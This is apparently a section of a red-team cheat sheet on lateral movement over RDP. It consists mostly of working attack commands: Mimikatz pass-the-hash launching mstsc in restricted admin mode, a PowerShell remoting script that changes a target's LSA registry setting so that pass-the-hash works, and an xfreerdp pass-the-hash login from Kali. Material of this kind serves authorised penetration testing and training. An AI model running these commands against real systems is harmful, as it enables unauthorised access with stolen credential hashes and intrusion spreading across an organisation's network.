# 08.05 RDP Lateral Movement

> Section 9.1 · mstsc, restricted admin mode, PTH via Mimikatz

## Overview

RDP blends with normal corporate traffic. Standard login caches NTLM hash in LSASS. Restricted admin mode uses a network logon (no credentials cached) and allows Pass-the-Hash. Enable restricted admin via registry if you have a local admin hash but it's not enabled.

## Steps

- **Standard RDP** — `mstsc.exe`, enter credentials; hash is cached in LSASS on target.
- **Restricted admin mode** — `mstsc.exe /restrictedadmin`; uses current session token; no credentials cached.
- **PTH via Mimikatz** — `sekurlsa::pth /user:admin /domain:<DOMAIN> /ntlm:<HASH> /run:mstsc.exe` spawns mstsc in the hash context.
- **Enable restricted admin via WinRM** — if you have a hash but restricted admin is disabled, enable via registry then PTH.
- **xfreerdp on Kali** — `xfreerdp /v:<TARGET> /u:<USER> /pth:<HASH> /cert:ignore /restrictedadmin`.

## Commands

### Mimikatz PTH + mstsc

```cmd
mimikatz# privilege::debug
mimikatz# sekurlsa::pth /user:admin /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:"mstsc.exe /restrictedadmin"
```

### Enable restricted admin via PowerShell remoting

```powershell
# Enable on target when you have a local admin hash
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<domain>\admin', $pass)
$sess = New-PSSession -ComputerName <TARGET> -Credential $cred
Invoke-Command -Session $sess -ScriptBlock {
    New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' `
        -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force
}
```

### xfreerdp PTH from Kali

```bash
xfreerdp /v:<TARGET> /u:<USER> /d:<DOMAIN> /pth:<NTLM_HASH> \
  /cert:ignore /restrictedadmin
```
